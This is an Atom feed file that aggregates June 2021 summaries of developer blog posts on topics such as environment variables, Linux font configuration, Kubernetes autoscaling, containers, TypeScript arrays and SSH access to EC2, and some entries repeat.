<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>urn:2021-06-04T01:51:54.910Z</id>
    <title>osmos::feed</title>
    <updated>2021-06-04T01:51:54.910Z</updated>
    <generator>osmosfeed 1.10.2</generator>
    <link rel="alternate" href="index.html"/>
    <entry>
        <title type="html"><![CDATA[Using Environment Variables in Python for App Configuration and Secrets]]></title>
        <id>https://dev.to/ryanblunden/using-environment-variables-in-python-for-app-configuration-and-secrets-3708</id>
        <link href="https://dev.to/ryanblunden/using-environment-variables-in-python-for-app-configuration-and-secrets-3708"/>
        <updated>2021-06-04T01:28:09.000Z</updated>
        <summary type="html"><![CDATA[Learn how experienced developers use environment variables in Python, including managing default values and typecasting.





As a developer, you’ve likely used environment variables in the command line or shell scripts, but have you used them as a way of configuring your Python applications?
This guide will show you all the code necessary for getting, setting, and loading environment variables in Python, including how to use them for supplying application config and secrets.
Not familiar with environment variables? Check out our ultimate guide for using environment variables in Linux and Mac.
Before digging into how to use environment variables in Python, it's important to understand why they're arguably the best way to configure applications. The main benefits are:
  Deploy your applicat…]]></summary>
        <author>
            <name>Ryan Blunden</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Goodbye ENV Files]]></title>
        <id>https://dev.to/ryanblunden/goodbye-env-files-4bi7</id>
        <link href="https://dev.to/ryanblunden/goodbye-env-files-4bi7"/>
        <updated>2021-06-04T01:27:54.000Z</updated>
        <summary type="html"><![CDATA[What are ENV files and why as an industry should we move away from them?





Three months ago we stopped using ENV files as the default export option in the Doppler CLI. This change led to a number of benefits including supporting multi-line variables and a deterministic schema. Before going too deep on the technical choices we made, let's first go over what ENV files are and how they're used.
What are ENV files?


ENV files are plain text files that store variables and secrets that you would not want hardcoded in your codebase. These variables could be a port number or a database url, and may change depending on where your code is deployed. For example, when developing locally you may use port 3000, but when deployed to Heroku your application will need to use the port it's dynamically a…]]></summary>
        <author>
            <name>Ryan Blunden</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Goodbye ENV Files]]></title>
        <id>https://dev.to/ryanblunden/goodbye-env-files-4bi7</id>
        <link href="https://dev.to/ryanblunden/goodbye-env-files-4bi7"/>
        <updated>2021-06-04T01:27:54.000Z</updated>
        <summary type="html"><![CDATA[What are ENV files and why as an industry should we move away from them?





Three months ago we stopped using ENV files as the default export option in the Doppler CLI. This change led to a number of benefits including supporting multi-line variables and a deterministic schema. Before going too deep on the technical choices we made, let's first go over what ENV files are and how they're used.
What are ENV files?


ENV files are plain text files that store variables and secrets that you would not want hardcoded in your codebase. These variables could be a port number or a database url, and may change depending on where your code is deployed. For example, when developing locally you may use port 3000, but when deployed to Heroku your application will need to use the port it's dynamically a…]]></summary>
        <author>
            <name>Ryan Blunden</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Export GitHub Issues, Commit History and More | GitHub Artifact Exporter]]></title>
        <id>https://dev.to/n3wt0n/export-github-issues-commit-history-and-more-github-artifact-exporter-2ok6</id>
        <link href="https://dev.to/n3wt0n/export-github-issues-commit-history-and-more-github-artifact-exporter-2ok6"/>
        <updated>2021-06-04T01:18:42.000Z</updated>
        <summary type="html"><![CDATA[Today I'm going to show you how you can easily export Issue, Releases, Milestone, Commit History and more from GitHub, using the GitHub Artifact Exporter.
GitHub Artifact Exporter provides a CLI and a simple GUI for exporting GitHub Issues and related comments based on a date range, and it supports GitHub’s full search syntax, allowing you to filter results based on your search parameters.

The CLI also supports exporting:
Commits
Milestones,
Projects
Pull requests, including comments
Releases

And you can export all of that in different formats: JSON, JSON lines, CSV, and Jira-formatted CSV. And of course if you export in CSV, it means that you can open it in Excel. Cool right?
As usual, if you are a visual learner, or simply prefer to watch and listen instead of reading, here you have th…]]></summary>
        <author>
            <name>Davide Benvegnù</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[เปลี่ยน default font ของ MX Linux]]></title>
        <id>https://dev.to/veer66/default-font-mx-linux-45nf</id>
        <link href="https://dev.to/veer66/default-font-mx-linux-45nf"/>
        <updated>2021-06-04T01:04:16.000Z</updated>
        <summary type="html"><![CDATA[(จาก qua.name 24 มิถุนายน 2563) 
บางทีเปลี่ยน font แล้วลง พวก Noto เรียนร้อยแล้วก็ยังไม่ได้อย่างใจ บางทีเป็นเพราะว่าระบบจะเลือก font ให้เราเอง ซึ่งไปแก้ได้ในไฟล์
ผมชึ้นหัวว่า MX Linux แต่จริง ๆ จะใช้ Void Linux, Ubuntu กระทั่งพวก NetBSD ก็น่าจะเหมือนกันหมด
$HOME/.config/fontconfig/fonts.conf
ซึ่งอันนี้ผมแก้ตาม https://jichu4n.com/posts/how-to-set-default-fonts-and-font-aliases-on-linux/ และ https://wiki.archlinux.org/index.php/Font_configuration/Examples
สมมุติว่าในกรณีที่ลง Noto แต่ไม่มี font ของ TLWG นะครับ ใส่ไปแบบนี้
<?xml version='1.0'?>
<!DOCTYPE fontconfig SYSTEM 'fonts.dtd'>
<fontconfig>
  <match>
    <test compare="contains" name="lang">
      <string>th</string>
    </test>
    <edit mode="prepend" name="family">
      <string>Noto Sans Thai</string>
    </edit>
  </match>
  <alias>
    <family>serif</family>
    <prefer>
      <family>Noto Serif</family>
    </prefer>    
  </alias>
  <alias>
    <family>sans-serif</family>
    <prefer>
      <family>Noto Sans</family>
    </prefer>    
  </alias>
  <alias>
    <family>sans</family>
    <prefer>
      <family>Noto Sans</family>
    </prefer>    
  </alias>
  <alias>
    <family>monospace</family>
    <prefer>
      <family>Noto Mono</family>
    </prefer>    
  </alias>
</fontconfig>


`
แต่ทำไปทำมาก็รู้สึกว่าไม่ค่อยโดยเท่าไหร่ ผมก็ลง Loma แล้วเปลี่ยน Noto Sans Thai เป็น Loma อยู่ดี]]></summary>
        <author>
            <name>Vee Satayamas</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[วิธีปรับแต่ง font ของ MX Linux]]></title>
        <id>https://dev.to/veer66/font-mx-linux-5hip</id>
        <link href="https://dev.to/veer66/font-mx-linux-5hip"/>
        <updated>2021-06-04T01:02:52.000Z</updated>
        <summary type="html"><![CDATA[(จาก qua.name 17 สิงหาคม 2563)
sudo apt-get install fonts-noto fonts-noto-extra fonts-noto-core fonts-noto-mono fonts-noto-ui-core fonts-noto-ui-extra fonts-noto-cjk fonts-noto-unhinted fonts-noto-hinted fonts-noto-cjk-extra fonts-noto-color-emoji
mkdir -p $HOME/.config/fontconfig
cat > $HOME/.config/fontconfig/fonts.conf
แปะอันนี้ใส่ไป
<?xml version='1.0'?>
<!DOCTYPE fontconfig SYSTEM 'fonts.dtd'>
<fontconfig>
  <match>
    <test compare="contains" name="lang">
      <string>th</string>
    </test>
    <edit mode="prepend" name="family">
      <string>Noto Sans Thai</string>
    </edit>
  </match>
  <alias>
    <family>serif</family>
    <prefer>
      <family>Noto Serif</family>
    </prefer>    
  </alias>
  <alias>
    <family>sans-serif</family>
    <prefer>
      <family>Noto Sans</family>
    </prefer>    
  </alias>
  <alias>
    <family>sans</family>
    <prefer>
      <family>Noto Sans</family>
    </prefer>    
  </alias>
  <alias>
    <family>monospace</family>
    <prefer>
      <family>Noto Mono</family>
    </prefer>    
  </alias>
</fontconfig>


`
กด control D 
เสร็จ]]></summary>
        <author>
            <name>Vee Satayamas</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Setup Your Fastify Server With Logging The Right Way - No More Express]]></title>
        <id>https://dev.to/wolfejw86/setup-your-fastify-server-with-logging-the-right-way-no-more-express-4n56</id>
        <link href="https://dev.to/wolfejw86/setup-your-fastify-server-with-logging-the-right-way-no-more-express-4n56"/>
        <updated>2021-06-04T00:50:34.000Z</updated>
        <summary type="html"><![CDATA[Learning a new Node.js framework can be daunting given the speed at which the ecosystem moves these days. Also some of the information on learning new techniques with Node.js is outdated - for example the sheer number of Express tutorials you still find out there! Express is long overdue for a replacement, and Fastify fits right in!  One of the first things to consider when running a Node.js server is how to handle logging the right way. ExpressJS did not offer anything out of the box, forcing another bike shed to paint amongst your team.  Fastify on the other hand recognizes that this is a critical piece of running a server and provides sensible defaults - in the case of logging - the pino logger. Join me in this article where I walk through how to setup a Fastify Node.js logger the right…]]></summary>
        <author>
            <name>Jay Wolfe</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[JavaScript Tutorial – How to Set Up a Front End Development Project]]></title>
        <id>60b11ff811ffb70827ef8f94</id>
        <link href="https://www.freecodecamp.org/news/how-to-set-up-a-front-end-development-project/"/>
        <updated>2021-06-03T21:44:03.000Z</updated>
        <summary type="html"><![CDATA[Let’s say you plan to build a website. Before you start, you want to set up a few tools to make your life easier. But which tools should you have? The JavaScript ecosystem is changing so fast that it can be overwhelming to pick the best tools to use.]]></summary>
        <author>
            <name>freeCodeCamp.org</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Integração e Entrega Contínuas (CI/CD) de site estático em servidor Linux usando GitLab]]></title>
        <id>https://dev.to/xjuggl3r/integracao-e-entrega-continuas-ci-cd-de-site-estatico-em-servidor-linux-usando-gitlab-3kbb</id>
        <link href="https://dev.to/xjuggl3r/integracao-e-entrega-continuas-ci-cd-de-site-estatico-em-servidor-linux-usando-gitlab-3kbb"/>
        <updated>2021-06-03T20:13:41.000Z</updated>
        <summary type="html"><![CDATA[Quando estamos trabalhando em alguma empresa ou projeto, é uma prática comum entrarmos rapidamente no espírito de equipe, que normalmente acontece devido à aplicação de metodologias ágeis, ou, em um estágio mais avançado, com uma cultura devops mais encorpada.
Mas, naqueles projetos pessoais, muitas vezes a máxima "em casa de ferreiro, espeto de pau", também é uma realidade. As razões podem ser várias, mas geralmente há aquela noção de que os demais projetos e atividades têm prioridade no uso do tempo.
O resultado, muitas vezes, é desorganização que pode custar perda de tempo, dados e, com isso, dinheiro.
Então, nessa ideia de "arrumar a casa", vou mostrar como implementei o CI/CD de um de meus projetos, o Gunbot Brasil. A pipeline é simples, e o conceito é aplicável para qualquer site est…]]></summary>
        <author>
            <name>xJuggl3r</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to create a Linux VM Instance with Nginx in GCP with the Cloud SDK]]></title>
        <id>https://dev.to/tonyette/how-to-create-a-linux-vm-instance-with-nginx-in-gcp-with-the-cloud-sdk-3j01</id>
        <link href="https://dev.to/tonyette/how-to-create-a-linux-vm-instance-with-nginx-in-gcp-with-the-cloud-sdk-3j01"/>
        <updated>2021-06-03T19:57:10.000Z</updated>
        <summary type="html"><![CDATA[My first interaction with the Google Cloud Platform was through its graphical Console: easy to use and navigate. Gradually I became acquainted with the Shell available within the GCP console but nothing feels like being able to connect to the cloud resources directly from the command-line interface of your local computer. So I decide to document how to create the most basic of the cloud resources available on the GCP platform which is the VM instance. This article shows how to create a Linux VM in the Google Cloud platform with the Cloud SDK which is the gcloud command line tool that helps you connect with Google Cloud products and services. In this tutorial we will be creating an Ubuntu 18.04 Linux machine in one of the GCP zones located in the US central region and  then install an Nginx…]]></summary>
        <author>
            <name>Feyisayo Famakinde</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Angular: SSR vs SSG]]></title>
        <id>https://dev.to/pamelakelly0023/angular-ssr-vs-ssg-11lo</id>
        <link href="https://dev.to/pamelakelly0023/angular-ssr-vs-ssg-11lo"/>
        <updated>2021-06-03T19:13:49.000Z</updated>
        <summary type="html"><![CDATA[Server Side Render (SSR)


Nesse modelo a renderização fica a cargo do servidor, o que torna o carregamento da aplicação mais eficiente. Além de possibilitar melhor performance, nesse modelo também podemos lidar com alguns problemas de SEO (como indexação).
Indexação: é possível definir o conteúdo que será carregado a partir do servidor, sendo assim, este conteúdo seria indexado nos motores de busca. 
Aparelho do usuário: como a renderização acontece do lado do servidor, ocorre uma menor exigência do dispositivo do usuário. 
Performance: Na maioria dos casos tem boa performance e bons resultados na experiência por parte do usuário.
Time to first byte maior, já que o servidor irá preparar o conteúdo a ser carregado.
Reload nas mudanças de rota.
Como indicação para desenvolver com SSR no Ang…]]></summary>
        <author>
            <name>pamelakelly0023</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Kubernetes AutoScaling Series: Cluster AutoScaler]]></title>
        <id>https://dev.to/chrisedrego/kubernetes-autoscaling-series-cluster-autoscaler-3m8l</id>
        <link href="https://dev.to/chrisedrego/kubernetes-autoscaling-series-cluster-autoscaler-3m8l"/>
        <updated>2021-06-03T19:05:14.000Z</updated>
        <summary type="html"><![CDATA[A Complete Zero-to-Hero Guide to Kubernetes Cluster AutoScaler which allows scaling the number of nodes based on the resource requests and avoids having your pods waiting in the Pending State.
Kubernetes is feature filled with all the good-ness one of which is scaling, it’s often & assumption that Kubernetes comes with AutoScaling **as default, but that’s hardly the case, we often need to tweak the bars to make things actually work. Today we would discuss how we can use *Kubernetes Cluster AutoScaler *to **scale Kubernetes Nodes.
Cluster Autoscaler is an amazing utility that automatically upscales & down-scales the number of nodes based on the request of the resource for pods.
Cluster Autoscaler can be used to scale both the Kubernetes Control Plane(master nodes) or Data plane (worker node…]]></summary>
        <author>
            <name>chrisedrego</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Creating Production-Ready Containers - The Basics]]></title>
        <id>https://dev.to/wimpress/creating-production-ready-containers-the-basics-3k6f</id>
        <link href="https://dev.to/wimpress/creating-production-ready-containers-the-basics-3k6f"/>
        <updated>2021-06-03T18:52:51.000Z</updated>
        <summary type="html"><![CDATA[So you've coded an awesome app and you are ready to deploy it to the cloud. You've heard a lot about Docker and completed a few online tutorials to containerise your app. All set, right? But what do you need to know if you're going to move that app to a production environment on the public Internet? What if you're using it for your job and need to pass security scans and DevOps checks?
In this series, I introduce some basic concepts for making production ready containers. I also introduce the concept of "slimming" a container. Slimming refers to both optimising and minifying your Docker containers, reducing them in size by up to 80-percent while also making them more secure by decreasing the attack surface. Slimming your container is also a great way to implement container best practices w…]]></summary>
        <author>
            <name>Martin Wimpress</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Creating Production-Ready Containers - The Basics]]></title>
        <id>https://dev.to/wimpress/creating-production-ready-containers-the-basics-3k6f</id>
        <link href="https://dev.to/wimpress/creating-production-ready-containers-the-basics-3k6f"/>
        <updated>2021-06-03T18:52:51.000Z</updated>
        <summary type="html"><![CDATA[So you've coded an awesome app and you are ready to deploy it to the cloud. You've heard a lot about Docker and completed a few online tutorials to containerise your app. All set, right? But what do you need to know if you're going to move that app to a production environment on the public Internet? What if you're using it for your job and need to pass security scans and DevOps checks?
In this series, I introduce some basic concepts for making production ready containers. I also introduce the concept of "slimming" a container. Slimming refers to both optimising and minifying your Docker containers, reducing them in size by up to 80-percent while also making them more secure by decreasing the attack surface. Slimming your container is also a great way to implement container best practices w…]]></summary>
        <author>
            <name>Martin Wimpress</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Schofield&#x27;s Laws of Computing – What they Are and Why You Should Know Them]]></title>
        <id>60afd68611ffb70827ef86d8</id>
        <link href="https://www.freecodecamp.org/news/schofields-laws-of-computing/"/>
        <updated>2021-06-03T18:46:12.000Z</updated>
        <summary type="html"><![CDATA[Schofield's Laws of Computing are principles that anyone who works with computers should know. They're focused on data portability, integrity, and security.  Jack Schofield was a British journalist who wrote for The Guardian. During that time, he wrote three particular articles called "Schofield's Laws of Computing". Jack didn't create these]]></summary>
        <author>
            <name>freeCodeCamp.org</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Lists in Python – A Comprehensive Guide]]></title>
        <id>60b7c02cacb62507dd1d7b80</id>
        <link href="https://www.freecodecamp.org/news/lists-in-python-comprehensive-guide/"/>
        <updated>2021-06-03T18:42:20.000Z</updated>
        <summary type="html"><![CDATA[Let’s suppose you’re planning to visit your neighborhood store to stock up on essentials. What is the first thing you’d do?  Have the answer already? Yes, you'd probably write down a shopping list! Python also has a built-in data structure called List that’s very similar to]]></summary>
        <author>
            <name>freeCodeCamp.org</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Linux Basic Part-00]]></title>
        <id>https://dev.to/shadow_aryan/linux-basic-part-00-476n</id>
        <link href="https://dev.to/shadow_aryan/linux-basic-part-00-476n"/>
        <updated>2021-06-03T18:28:59.000Z</updated>
        <summary type="html"><![CDATA[I am using Kali linux through out the whole Blog Series of Linux Basic Command to demostrate you the linux basic command. 
ls Command


ls means listing.
This command list the files and folders in the current directory.


you can also use (-l) flag in ls to see the list of files and folders with, at what time they are created , permission that given to them, etc.
i.e- ls -l






2.pwd Command
to view the current directory you are working in.




3.clear Command
clear everything on the terminal.




4.exit Command
this command is used to close the terminal.




If you are having any problem in understanding the commands you can watch the video through the link that is given below:-
linux basic part- 00
Hope you like the 00 part of blog series of linux basic command blog.
Part 01 - Link basic part - 01]]></summary>
        <author>
            <name>ShadowAryan</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Fullstack GraphQL starter kit Mid-2021 update]]></title>
        <id>https://dev.to/karanpratapsingh/fullstack-graphql-starter-kit-mid-2021-update-2ck8</id>
        <link href="https://dev.to/karanpratapsingh/fullstack-graphql-starter-kit-mid-2021-update-2ck8"/>
        <updated>2021-06-03T18:12:05.000Z</updated>
        <summary type="html"><![CDATA[Hi Dev.to community, I am excited to share the Mid-2021 major update which adds tons exciting improvements to the starter kit.
Changelog
Webpack 5 + esbuild for blazing fast backend development 🎉 
Update CRA to v4 ⚡
Prisma to v2.20 🚀 
Switch to craco from react-app-rewired for better CRA v4 support (breaking change!)
update all major deps (ie. react, jest, eslint)
Full changelog/PR is available here
Github: https://github.com/karanpratapsingh/fullstack-starterkit
What do you think? as always feel free to reach out if you face any issues.
Happy coding 🎉]]></summary>
        <author>
            <name>Karan Pratap Singh</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Fullstack GraphQL starter kit Mid-2021 update]]></title>
        <id>https://dev.to/karanpratapsingh/fullstack-graphql-starter-kit-mid-2021-update-2ck8</id>
        <link href="https://dev.to/karanpratapsingh/fullstack-graphql-starter-kit-mid-2021-update-2ck8"/>
        <updated>2021-06-03T18:12:05.000Z</updated>
        <summary type="html"><![CDATA[Hi Dev.to community, I am excited to share the Mid-2021 major update which adds tons exciting improvements to the starter kit.
Changelog
Webpack 5 + esbuild for blazing fast backend development 🎉 
Update CRA to v4 ⚡
Prisma to v2.20 🚀 
Switch to craco from react-app-rewired for better CRA v4 support (breaking change!)
update all major deps (ie. react, jest, eslint)
Full changelog/PR is available here
Github: https://github.com/karanpratapsingh/fullstack-starterkit
What do you think? as always feel free to reach out if you face any issues.
Happy coding 🎉]]></summary>
        <author>
            <name>Karan Pratap Singh</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to Build a Hackintosh - Install MacOS Big Sur on a PC Using OpenCore]]></title>
        <id>60affbe411ffb70827ef8951</id>
        <link href="https://www.freecodecamp.org/news/build-a-hackintosh/"/>
        <updated>2021-06-03T18:07:17.000Z</updated>
        <summary type="html"><![CDATA[A Hackintosh is a non-Mac computer system, made with PC parts, that runs the macOS operating system. In this tutorial, you will learn how to create a Hackintosh. You will learn how to install macOS Big Sur (or any other version of macOS) using OpenCore. The main benefit of a]]></summary>
        <author>
            <name>freeCodeCamp.org</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Message Queues: Deep Dive]]></title>
        <id>https://dev.to/hookdeck/message-queues-deep-dive-2ldc</id>
        <link href="https://dev.to/hookdeck/message-queues-deep-dive-2ldc"/>
        <updated>2021-06-03T17:15:04.000Z</updated>
        <summary type="html"><![CDATA[Introduction


In a previous article, Introduction to Message Queues, we took a look at the fundamentals of message queues. The article introduced message queues, message producers and consumers, and the advantages to using message queues for asynchronous processing in our system architecture.
In this post, we will go further into the internals of message queues, and look at different strategies used to handle interaction between producers and consumers. We will also expand more on producers and consumers, and what application developers need to keep in mind when designing them to work with message queues.
A message queue does not work in isolation — it is mainly a broker of messages between message producers and message consumers. Each distinct entity in the setup has a responsibility and…]]></summary>
        <author>
            <name>Fikayo Adepoju</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Serverless vs Fully Managed Services: What&#x27;s the Difference?]]></title>
        <id>60aa708711ffb70827ef5f4b</id>
        <link href="https://www.freecodecamp.org/news/serverless-fully-managed-service-difference/"/>
        <updated>2021-06-03T16:51:37.000Z</updated>
        <summary type="html"><![CDATA[If you're new to cloud technologies, you might be confused about the difference between serverless technologies and managed services.  So in this article you'll learn what these terms mean and what the main differences are.    What Are Managed Services? A managed service let the end-user focus on using a service]]></summary>
        <author>
            <name>freeCodeCamp.org</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Cipher Definition – What is a Block Cipher and How Does it Work to Protect Your Data?]]></title>
        <id>5fff3d3098be260817e495bd</id>
        <link href="https://www.freecodecamp.org/news/what-is-a-block-cipher/"/>
        <updated>2021-06-03T16:21:19.000Z</updated>
        <summary type="html"><![CDATA[Cryptography is the science of using codes and ciphers to protect messages. And encryption involves encoding messages so that only the intended recipient can understand the meaning of the message. It's often used to protect data in transit. Encryption is a two way function – that is, you need to be]]></summary>
        <author>
            <name>freeCodeCamp.org</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Create Your First Angular Application]]></title>
        <id>https://dev.to/paradocx96/create-your-first-angular-application-hp4</id>
        <link href="https://dev.to/paradocx96/create-your-first-angular-application-hp4"/>
        <updated>2021-06-03T16:14:03.000Z</updated>
        <summary type="html"><![CDATA[Hi guys! I am going to explain you to how to setup your local environment and workspace for create your first Angular application locally using Angular CLI tool. Simply following my steps finally, you can create Angular applications and configure application yourself. I am using my Windows pc to show you to understand the commands I used to create Angular application.
Step 01


Before create application there are some prerequisites.
1. You should be familiar with following.
JavaScript
HTML
CSS
TypeScript (Not required)
2. To install Angular on your local system, you must install following.
Node.js (Version: Current, Active LTS or Maintenance LTS) 
You can  download and install Node.js follow this  link. If you already installed Node.js you can run this command on terminal window.
node -v

…]]></summary>
        <author>
            <name>Navinda Lankesh</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Data Structures in Typescript - Array]]></title>
        <id>https://dev.to/ricardo93borges/data-structures-in-typescript-array-23mo</id>
        <link href="https://dev.to/ricardo93borges/data-structures-in-typescript-array-23mo"/>
        <updated>2021-06-03T15:43:00.000Z</updated>
        <summary type="html"><![CDATA[An array is a common data structure that holds items of the same type, in Typescript, unlike other languages, an array doesn't have a fixed length. Also, in Typescript, you don't have to re-organize all elements of an array when makings operations like insert or delete.

Elements are the items stored in an array
Index is the location of an element in an array, it goes from 0 to (array length - 1)




/** An array can be written like this **/

const numbers: number[] = [1, 2, 3, 4]
const names = string[] = ['Snake', 'Ocelot', 'Otacon', 'Naomi']

/** Also can be written using a generic array type, Array<elemType> **/

let list: Array<number> = [1, 2, 3, 4]
let list: Array<string> = ['Snake', 'Ocelot', 'Otacon', 'Naomi']

Traverse - Print all array items one by one
/** 3 ways to iterate an array **/

for(let i=0; i<array.length; i++) {
    console.log(array[i])
}

for(const item of array) {
    console.log(item)
}

array.forEach(item => {
    console.log(item)
})

Insertion - Add an item
/** add to the end **/
array.push(5)

/** add to the beginning **/
array.unshift(0)

/** add in a specific index position **/
array.splice(3, 0, 8) // add 8 in the index 3

Deletion - Remove an item
/** remove from the end **/
array.pop()

/** remove from the beginning **/
array.shift()

/** remove from a specific index position **/
array.splice(2, 1) // remove from index 2

Update - Update an item
/** update element in position 1 **/
array[1] = 7

Search - Search by an item
/** you can traverse an array to find an element by its value, or simply use the .find() function **/

const item = array.find(item => item === 3) // search by an item with value 3

All above operations can be performed on strings to solve problems like count the occurrences of a character in a string:
let str = "aabbccdd"
let occurrences = 0

for(let i=0; i < str.length; i++) {
    if(str[i] === "c") {
        occurrences++
    }
}

console.log(occurrences) // prints 2]]></summary>
        <author>
            <name>Ricardo Borges</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Self-hosting software & why it may be worth considering again now]]></title>
        <id>https://dev.to/signoz/self-hosting-software-why-it-may-be-worth-considering-again-now-454l</id>
        <link href="https://dev.to/signoz/self-hosting-software-why-it-may-be-worth-considering-again-now-454l"/>
        <updated>2021-06-03T14:57:48.000Z</updated>
        <summary type="html"><![CDATA[I can hear your mind wheels spinning -
What’s this blasphemy? Isn’t SaaS the end of all evils - why are you asking me to think about keeping data in your infrastructure?
Well, well - allow me to explain. SaaS is the greatest thing after sliced bread, if you are a small startup. You don’t care about where your data is, privacy and security is not something which you are concerned about right now. You just want to move fast and break things!
But not all companies are born equal, and not all industries are the same in terms of the sensitivity of data they handle. And as you mature as a company, you need to be more careful of how you handle your critical data.
For example, if you are a fast growing fin-tech company working with a number of banking APIs and enabling hundreds of financial transa…]]></summary>
        <author>
            <name>Ankit Anand</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[How to exclude password from mongoose mongodb]]></title>
        <id>https://dev.to/akshatsinghania/how-to-exclude-password-from-mongoose-mongodb-2248</id>
        <link href="https://dev.to/akshatsinghania/how-to-exclude-password-from-mongoose-mongodb-2248"/>
        <updated>2021-06-03T14:49:11.000Z</updated>
        <summary type="html"><![CDATA[While logging or registering the user , we generally return the user data , password or hashed password is also returned along with the data , we do not want to send the hashed password to frontend so how do we exclude.
After creating user
const createdUser = await User.create({
  email: email,
  password: await argon2.hash(password),
});
if (createdUser) {
  const { password, ...responseUser } = createdUser._doc;
  return { user: responseUser };
}

the ._doc contains the data like email , username , password which we specify in the schema
let user = await User.findOne({ email: email });
if (user) {
  if (await argon2.verify(user.password, password)) {
    const { password, ...responseUser } = user._doc;
    return { user: responseUser };
  } else {
    return {
      error: [{ field: "password", message: "wrong password" }],
    };
  }
}

We do the same thing but after finding the user
Thanks for reading, hearts ❤️ if you liked it and unicorns 🦄 if you loved it, follow if you wanna read more awesome blogs]]></summary>
        <author>
            <name>Akshat Singhania</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Connect to EC2 via SSH]]></title>
        <id>https://dev.to/suhaskaranth/connect-to-ec2-via-ssh-1ak3</id>
        <link href="https://dev.to/suhaskaranth/connect-to-ec2-via-ssh-1ak3"/>
        <updated>2021-06-03T14:34:36.000Z</updated>
        <summary type="html"><![CDATA[After a long gap, I am continuing my blog on AWS. In my previous two blogs, I have written about Intro to AWS  and Intro to EC2 . 
Once you have the Linux based EC2 created, you can access the machine via the following ways :
SSH on Linux based system
SSH using putty on Windows
Ec2 Instance connect 
Using Linux based system:
The command we can use to login to a Linux machine is SSH  : 
ssh  Ec2-user@<public-Ip_of_Ec2_Instance>
but when we try this to connect using ec2-user as our user and giving the public IP, you should encounter an error saying permission denied. We will need to provide the .pem file that we download during our instance creation as an additional security measure. This is done to avoid any unwanted person accessing our Ec2 server. 
So we need to specify the path for the .…]]></summary>
        <author>
            <name>suhas karanth</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hexagons and Beyond: Flexible, Responsive Grid Patterns, Sans Media Queries]]></title>
        <id>https://css-tricks.com/?p=341584</id>
        <link href="https://css-tricks.com/hexagons-and-beyond-flexible-responsive-grid-patterns-sans-media-queries/"/>
        <updated>2021-06-03T14:25:57.000Z</updated>
        <summary type="html"><![CDATA[A little while back, Chris shared this nice hexagonal grid. And true to its name, it’s using —wait for it — CSS Grid to form that layout. It’s a neat trick! Combining grid columns, grid gaps, and creative clipping …
The post Hexagons and Beyond: Flexible, Responsive Grid Patterns, Sans Media Queries appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Temani Afif</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Monitoring Lighthouse Scores and Core Web Vitals with DebugBear]]></title>
        <id>https://css-tricks.com/?p=341494</id>
        <link href="https://css-tricks.com/monitoring-lighthouse-scores-and-core-web-vitals-with-debugbear/"/>
        <updated>2021-06-03T14:25:19.000Z</updated>
        <summary type="html"><![CDATA[DebugBear takes just a few seconds to start using. You literally point it at a URL you want to watch, and it’ll start watching it. You install nothing.
It’ll start running tests, and you’ve immediately got performance charts you can …
The post Monitoring Lighthouse Scores and Core Web Vitals with DebugBear appeared first on CSS-Tricks.
You can support CSS-Tricks by being an MVP Supporter.]]></summary>
        <author>
            <name>Chris Coyier</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Cloud Technology News of the Month: May 2021]]></title>
        <id>https://dev.to/castai/cloud-technology-news-of-the-month-may-2021-1fpm</id>
        <link href="https://dev.to/castai/cloud-technology-news-of-the-month-may-2021-1fpm"/>
        <updated>2021-06-03T14:24:40.000Z</updated>
        <summary type="html"><![CDATA[Another portion of cloud technology news is at your doorstep! This series brings you up to speed with the latest releases, acquisitions, research, and hidden gems in the world of cloud computing – the stuff actually worth reading. 
Here’s what the cloud world has been up to this May.
Ok, this isn’t exactly news. But the analysis from a16z deserves your attention.
Here’s the gist of the piece:
While cloud delivers on its promise early on, once your company scales and its growth slows down, cloud costs start putting pressure on margins and contribute A LOT to COR or COGS.



Repatriating (going on-prem) is one solution. Dropbox achieved a smashing $75 million in cost savings by doing that.


50 top public software companies using the cloud are losing c. $100 billion of market value due to cl…]]></summary>
        <author>
            <name>CAST AI</name>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Dockerizing an angular app]]></title>
        <id>https://dev.to/ollita7/dockerizing-an-angular-app-3nef</id>
        <link href="https://dev.to/ollita7/dockerizing-an-angular-app-3nef"/>
        <updated>2021-06-03T13:55:38.000Z</updated>
        <summary type="html"><![CDATA[In this article I will show you how to dockerize an angular application using nginx server. If you would like more information about the nginx server  you can find it here: https://www.nginx.com/
To get started we create a dockerfile with two stages:
Stage 1
Copy the angular code from a local machine to a docker machine.
Copy the packages.json to install dependencies.
Install the angular-cli and npm dependencies.
